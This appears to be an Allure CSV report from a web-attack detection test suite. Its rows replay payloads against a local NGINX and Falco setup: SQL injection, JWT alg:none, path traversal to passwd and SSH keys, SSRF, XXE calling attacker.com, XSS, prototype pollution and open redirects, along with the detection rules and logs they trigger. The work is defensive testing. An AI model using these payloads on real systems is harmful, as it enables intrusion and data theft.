"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BIT_001` |
| **Name** | Bitwise OR Boolean Bypass |
| **Category** | SQLI |
| **Subcategory** | bitwise_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND 1|1--`
- **Encoded**: `'%20AND%201%7C1--`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[024_SQLI_BIT_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `JWT_NONE_001` |
| **Name** | JWT alg:none bypass (lowercase) |
| **Category** | JWT |
| **Subcategory** | alg_none |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.`
- **Encoded**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 08:21:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX JWT] JWT token attack attempt detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772266874271-bob86 pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772266874271-bob86 pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1

**Falco Log Entry**:
```
08:21:14.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772266874271-bob86 pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1
```","2","test_e2e_with_logs[680_JWT_NONE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_002` |
| **Name** | UTF-8 slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..%c0%af..%c0%af..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 08:20:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772266811347-cv6yy pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772266811347-cv6yy pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:20:11.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_002-1772266811347-cv6yy pattern_id=PATH_UNI_002 uri=/?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[289_PATH_UNI_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_002` |
| **Name** | Internal Elasticsearch Access |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://127.0.0.1:9200/_cat/indices`
- **Encoded**: `http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 08:20:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1772266847279-ttut68 pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1772266847279-ttut68 pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1

**Falco Log Entry**:
```
08:20:47.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1772266847279-ttut68 pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1
```","2","test_e2e_with_logs[611_SSRF_INT_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_URL_001` |
| **Name** | Open redirect via url param |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | url_param |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `url=https://evil.com`
- **Encoded**: `url%3Dhttps%3A%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 08:21:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_001-1772266864273-rnhbo pattern_id=REDIR_URL_001 uri=/?q=url%3Dhttps%3A%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_001-1772266864273-rnhbo pattern_id=REDIR_URL_001 uri=/?q=url%3Dhttps%3A%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
08:21:04.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_001-1772266864273-rnhbo pattern_id=REDIR_URL_001 uri=/?q=url%3Dhttps%3A%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[758_REDIR_URL_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_PROTO_001` |
| **Name** | Prototype Pollution Attack |
| **Category** | API_SECURITY |
| **Subcategory** | prototype_pollution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""__proto__"":{""isAdmin"":true}}`
- **Encoded**: `%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 08:20:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1772266825777-5cdccf pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1772266825777-5cdccf pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:20:25.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1772266825777-5cdccf pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[707_API_PROTO_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_DNS_003` |
| **Name** | IPv6 Loopback SSRF Bypass |
| **Category** | SSRF |
| **Subcategory** | dns_rebinding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://[::1]/`
- **Encoded**: `http%3A%2F%2F%5B%3A%3A1%5D%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 08:20:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_003-1772266853293-04g7hn pattern_id=SSRF_DNS_003 uri=/?q=http%3A%2F%2F%5B%3A%3A1%5D%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_003-1772266853293-04g7hn pattern_id=SSRF_DNS_003 uri=/?q=http%3A%2F%2F%5B%3A%3A1%5D%2F client=127.0.0.1

**Falco Log Entry**:
```
08:20:53.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_003-1772266853293-04g7hn pattern_id=SSRF_DNS_003 uri=/?q=http%3A%2F%2F%5B%3A%3A1%5D%2F client=127.0.0.1
```","2","test_e2e_with_logs[534_SSRF_DNS_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_001` |
| **Name** | Overlong UTF-8 dot encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
- **Encoded**: `%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 08:20:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772266810846-nhd8hn pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772266810846-nhd8hn pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:20:10.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772266810846-nhd8hn pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[288_PATH_UNI_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_001` |
| **Name** | Quadruple dot traversal variation |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `....//`
- **Encoded**: `....%2F%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~87000ms
- **Timestamp**: 08:19:51.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772266791805-v35zqr pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772266791805-v35zqr pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1

**Falco Log Entry**:
```
08:19:51.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772266791805-v35zqr pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1
```","2","test_e2e_with_logs[238_PATH_ADV_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNICODE_001` |
| **Name** | Unicode slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~88000ms
- **Timestamp**: 08:19:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1772266790803-8jjcbr pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1772266790803-8jjcbr pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:19:50.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1772266790803-8jjcbr pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[298_PATH_UNICODE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_093` |
| **Name** | Blind SQLi with Subquery |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1' AND (SELECT COUNT(*) FROM users)>0--`
- **Encoded**: `1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 08:20:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1772266815371-jfv1rh pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1772266815371-jfv1rh pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:15.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1772266815371-jfv1rh pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[022_SQLI_ADV_093]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HPP_AUTH_002` |
| **Name** | Access level override via HPP |
| **Category** | HPP |
| **Subcategory** | auth_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&access=all`
- **Encoded**: `%26access%3Dall`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~17000ms
- **Timestamp**: 08:21:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected` |
| **Matched Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_AUTH_002-1772266861779-tkq61d pattern_id=HPP_AUTH_002 uri=/?q=%26access%3Dall client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_AUTH_002-1772266861779-tkq61d pattern_id=HPP_AUTH_002 uri=/?q=%26access%3Dall client=127.0.0.1

**Falco Log Entry**:
```
08:21:01.000000000: Warning [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_AUTH_002-1772266861779-tkq61d pattern_id=HPP_AUTH_002 uri=/?q=%26access%3Dall client=127.0.0.1
```","2","test_e2e_with_logs[421_HPP_AUTH_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_009` |
| **Name** | Template string polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: ``alert('XSS')``
- **Encoded**: `%60alert%28%27XSS%27%29%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 08:20:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1772266809354-hp4am pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1772266809354-hp4am pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:09.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1772266809354-hp4am pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[204_XSS_POLY_009]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_009` |
| **Name** | SSH private key access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../home/user/.ssh/id_rsa`
- **Encoded**: `../../home/user/.ssh/id_rsa`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 08:19:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1772266785792-3o5ctk pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1772266785792-3o5ctk pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1

**Falco Log Entry**:
```
08:19:45.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1772266785792-3o5ctk pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1
```","2","test_e2e_with_logs[270_PATH_DOT_009]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_001` |
| **Name** | Character-by-character blind extraction |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT SUBSTRING(version(),1,1))='5' --`
- **Encoded**: `%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~90000ms
- **Timestamp**: 08:19:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1772266788817-gfuvo5 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1772266788817-gfuvo5 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:19:48.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1772266788817-gfuvo5 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[027_SQLI_BLIND_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 08:20:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772266803284-5u7jdw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772266803284-5u7jdw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
08:20:03.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1772266803284-5u7jdw pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[437_XXE_BLIND_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_URL_002` |
| **Name** | Open redirect via next param protocol-relative |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | url_param |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `next=//evil.com`
- **Encoded**: `next%3D%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 08:21:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_002-1772266864774-gxy09 pattern_id=REDIR_URL_002 uri=/?q=next%3D%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_002-1772266864774-gxy09 pattern_id=REDIR_URL_002 uri=/?q=next%3D%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
08:21:04.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_URL_002-1772266864774-gxy09 pattern_id=REDIR_URL_002 uri=/?q=next%3D%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[759_REDIR_URL_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
